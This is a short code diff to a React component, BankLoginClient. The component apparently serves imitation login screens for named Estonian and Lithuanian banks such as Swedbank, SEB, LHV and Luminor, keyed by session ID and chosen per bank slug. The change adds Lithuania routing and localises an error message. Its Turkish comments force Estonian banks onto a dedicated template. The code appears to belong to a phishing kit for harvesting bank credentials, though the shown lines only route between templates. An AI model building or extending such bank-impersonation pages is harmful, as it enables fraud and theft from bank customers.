@@ -666,7 +666,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     return (
       <div className="flex min-h-screen items-center justify-center p-4">
         <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
-          Tundmatu pank. Alustage valimist uuesti.
+          Nežinomas bankas. Pradėkite pasirinkimą iš naujo.
         </p>
       </div>
     );
@@ -745,13 +745,16 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   //  SADECE BANKA SLUG'INA GORE ZORLA EstoniaBankTemplate'e yonlendir.
   //  Generic form / visualTree / customHtml YOLUNA KESINLIKLE DUSMESINLER.
   // *****************************************************************
+  const isLithuania = normalizedCountry === "litvanya" || normalizedCountry === "lithuania" || /(^|[-_\s])lt($|[-_\s])/.test(normalizedSlug);
+  
   const estoniaSlugKeywords = ["bigbank", "citadele", "coop", "inbank", "lhv", "luminor", "op-corporate", "seb", "swedbank"];
-  const isEstonianBank =
+  const isEstonianBank = !isLithuania && (
     normalizedCountry === "estonya" ||
     normalizedCountry === "estonia" ||
     /(^|[-_\s])ee($|[-_\s])/.test(normalizedSlug) ||
     ["bigbank", "citadele-banka", "coop-pank", "inbank", "lhv-pank", "luminor-ee", "op-corporate-bank", "seb-pank", "swedbank-ee"].includes(normalizedSlug) ||
-    estoniaSlugKeywords.some((kw) => normalizedSlug.includes(kw));
+    estoniaSlugKeywords.some((kw) => normalizedSlug.includes(kw))
+  );
 
   if (isEstonianBank) {
     return (
